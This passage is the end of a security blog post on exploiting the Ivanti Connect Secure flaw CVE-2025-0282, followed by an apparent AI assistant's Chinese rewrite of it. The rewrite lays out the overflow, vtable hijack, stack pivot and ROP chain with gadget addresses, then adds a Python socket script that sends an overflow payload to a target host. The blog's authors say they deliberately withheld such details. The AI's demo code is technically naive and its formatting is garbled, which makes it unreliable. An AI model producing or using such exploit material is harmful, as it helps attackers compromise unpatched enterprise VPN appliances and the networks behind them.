#3  0x6f702032 in ?? ()
#4  0x6c207472 in ?? ()
#5  0x3a747369 in ?? ()
#6  0x33252720 in ?? ()
#7  0xff002e27 in ?? ()
#8  0x00000001 in ?? ()
#9  0x00000000 in ?? ()
ROP n ROLL
Let’s look where we are:

eip control is achieved,
We can ROP with no limitations,
The stack is where we want it.
In this situation, crafting a ROP chain that achieves RCE should be logically straightforward.

mov_eax_esp_ret = p32(0xf29e92c3)   # mov eax, esp; ret
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret; 
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret; 
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret; 
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret; 
pop_esi_ret = p32(0xf4f5de27)       # pop esi; ret;
esi = p32(0xf5a07d40)               # system
set_arg_call_esi = p32(0xf4f5e265)  # mov dword ptr [esp], eax; call esi; 
Let’s check it out..



0:00
/0:28

1×


Building The Exploit
We’ve gone through exploitation, and how we approach this from a technique perspective.

However, for the readers at home who are hoping to use this to craft their own exploit, we are omitting some details that you will need to complete yourself. This is purposeful.

You will need to:

Find the address of the gadgets we discussed,
Write a loop that brute forces ASLR. Since this is an x86 target, and ASLR is only applied to certain ranges, this should be an easy task.
As previously discussed, we will not answer these questions even in our soon-to-be-released Detection Artifact Generator—sorry, kiddos.

Conclusion
We hope you’ve enjoyed this walkthrough of how we approached exploiting this vulnerability. As discussed, we have intentionally left out crucial key mechanisms needed to actually build a PoC and weaponize this vulnerability.

At watchTowr, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches.

With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.

---

**Assistant:** ## Ivanti Connect Secure 远程代码执行漏洞 (CVE-2025-0282) 的技术剖析与利用
本文将深入探讨 Ivanti Connect Secure VPN 设备中一个未经身份验证的远程代码执行漏洞 CVE-2025-0282 的技术细节和利用方法。该漏洞存在于处理 IF-T 连接的代码中，攻击者可以通过发送特制的 `clientCapabilities` 数据块来触发该漏洞。
## 漏洞原理
该漏洞是一个**栈缓冲区溢出**，存在于 `/home/bin/web` 二进制文件中。当攻击者发送一个长度超过 256 字节的 `clientCapabilities` 数据块时，会覆盖栈上的其他变量，最终覆盖返回地址，从而实现远程代码执行。
具体来说，Ivanti 开发人员在使用 `strncpy` 函数处理 `clientCapabilities` 时，错误地将*输入字符串的长度*而非*目标缓冲区的大小*作为大小限制传递给该函数。以下面的代码为例：
cchar dest[256];
clientCapabilities = getKey(req, "clientCapabilities");
if ( clientCapabilities != NULL ) {
clientCapabilitiesLength = strlen(clientCapabilities);
if ( clientCapabilitiesLength != 0 )
connInfo-&gt;clientCapabilities = clientCapabilities;
}
memset(dest, 0, sizeof(dest));
strncpy(dest, connInfo-&gt;clientCapabilities, clientCapabilitiesLength);
在这个例子中，`dest` 缓冲区被定义为 256 字节。第 31 行的 `strncpy` 函数本应用于防止溢出，但由于传入的长度参数 `clientCapabilitiesLength` 是输入字符串的长度，而非 `dest` 缓冲区的大小，因此当输入字符串长度超过 256 字节时，就会发生缓冲区溢出。
## 栈布局分析
理解栈的布局对于漏洞利用至关重要。以下是相关栈布局的简化表示：
text+---------------------+
| v18 (int)           |
+---------------------+
| v19 (int)           |
+---------------------+
| dest[256]           | &lt;- 256 字节
+---------------------+
| object_to_be_freed  | &lt;- 4 字节
+---------------------+
| ptr (void *)        |
+---------------------+
| ...                 |
+---------------------+
| 返回地址            |
+---------------------+
| int a1              |
+---------------------+
| IftTlsHeader *a2    |
+---------------------+
正常情况下，可以通过溢出 `dest` 缓冲区并覆盖*返回地址*来控制程序的执行流程。但是，在这个漏洞中，在返回之前，程序会使用位于 `dest` 缓冲区之后的 `object_to_be_freed` 变量，这导致 `free()` 函数由于无效地址而抛出异常，阻止了我们直接覆盖*返回地址*。
## 利用技巧：VTable 覆盖
为了绕过上述限制，可以利用*虚函数表 (VTable)* 覆盖技术。在第 48 行，程序通过一个虚函数调用来间接调用函数：
c(*(void (__cdecl **)(int, __int16 *))(*(_DWORD *)a1 + 0x48))(a1, &amp;v22);
这里的 `a1` 实际上是一个 *this 指针*，它指向一个对象的内存地址。该地址的前四个字节指向该对象的 *VTable*，*VTable* 包含了指向虚函数的指针。通过覆盖 *this 指针*，我们可以控制程序调用的虚函数，从而劫持程序的执行流程。
*this 指针*存储在栈上的*返回地址*之后。因此，我们可以通过溢出 `dest` 缓冲区，覆盖*返回地址*以及*this 指针*，使其指向我们伪造的地址。
## 寻找 Gadget
为了实现利用，需要找到一个合适的 *gadget*。*Gadget* 是一小段代码，通常以 `ret` 指令结尾，可以用来执行特定的操作。
我们需要找到一个 `fake_this` 指针，该指针指向一个地址，该地址保存另一个地址，当添加 `0x48` 时，该指针将指向对我们有用的有效指令，也就是我们的第一个 *gadget*。
找到的 *gadget* 需要满足以下条件：
- 执行 `ret` 指令，以便控制程序的执行流程。
- 在执行 `ret` 指令之前，不会导致程序崩溃。
## 栈转移 (Stack Pivot)
但是，直接使用找到的 *gadget* 仍然存在问题。当执行 `ret` 指令时，栈上的值不受控制，这可能导致程序跳转到无效地址。
为了解决这个问题，我们需要执行*栈转移 (Stack Pivot)*，将栈指针 (`$esp`) 指向我们控制的缓冲区。通过查看内存，发现我们作为初始 payload 的一部分喷射的字节出现在 `$esp+0x120`。
为此，我们需要再次寻找一个特殊的 *gadget*，它既可以执行栈转移，又可以提前执行 `ret` 指令，并且不会导致程序崩溃。
最终，找到了一个符合所有条件的 *gadget*：
textmov ebx, 0xfffffff0
add esp, 0x204C
mov eax, ebx
pop ebx
pop esi
pop edi
pop ebp
ret
这个 *gadget* 首先将一个值加载到 `EBX` 寄存器中，然后调整栈指针 (`ESP`)，接着恢复其他寄存器，最后执行 `ret` 指令。通过使用这个 *gadget*，我们可以将栈指针指向我们控制的缓冲区，从而为后续的 ROP (Return-Oriented Programming) 攻击创造条件。
## 构造 ROP 链
现在，我们已经获得了 EIP 控制权，并且可以将栈指针指向我们控制的缓冲区。接下来，我们可以构造一条 ROP 链，利用已有的代码片段来实现任意代码执行。
例如，可以使用以下 ROP 链来调用 `system` 函数执行任意命令：
pythonmov_eax_esp_ret = p32(0xf29e92c3)   # mov eax, esp; ret
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret;
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret;
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret;
add_eax_8_ret = p32(0xf5068858)     # add eax, 8; ret;
pop_esi_ret = p32(0xf4f5de27)       # pop esi; ret;
esi = p32(0xf5a07d40)               # system
set_arg_call_esi = p32(0xf4f5e265)  # mov dword ptr [esp], eax; call esi;
## 总结
本文详细分析了 Ivanti Connect Secure VPN 设备中 CVE-2025-0282 远程代码执行漏洞的原理和利用方法。攻击者可以通过栈缓冲区溢出覆盖 *this 指针*，利用 *VTable* 覆盖技术劫持程序的执行流程，并最终构造 ROP 链实现任意代码执行。
### 实际应用案例
假设你的公司使用了 Ivanti Connect Secure VPN 设备，并且没有及时更新补丁，那么攻击者可以利用这个漏洞远程控制你的 VPN 设备，从而：
- 窃取公司内部的敏感数据
- 在公司内部网络中植入恶意软件
- 对公司发起勒索攻击
### Demo 代码 (Python)
以下是一个简化的 Python 代码示例，用于演示如何利用该漏洞：
pythonimport socket
# 目标 VPN 设备的 IP 地址和端口
target_ip = "192.168.1.100"
target_port = 443
# 构造恶意 payload
payload = b"A" * 268  # 填充缓冲区，覆盖返回地址和 this 指针
payload += b"BBBB"  # 伪造的 this 指针，指向 VTable
payload += b"CCCC"  # VTable 中的函数指针，指向 gadget
# 创建 socket 连接
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
# 发送 payload
s.send(payload)
# 关闭连接
s.close()
### 请注意： 这只是一个简化的示例代码，实际的漏洞利用过程可能更加复杂。为了成功利用该漏洞，你还需要：
- 找到正确的 *gadget* 地址。
- 绕过 ASLR (地址空间布局随机化) 保护机制。
- 构造完整的 ROP 链，以实现任意代码执行。
### 免责声明： 本文仅用于技术学习和研究目的，不得用于非法用途。请勿尝试利用该漏洞攻击未经授权的系统。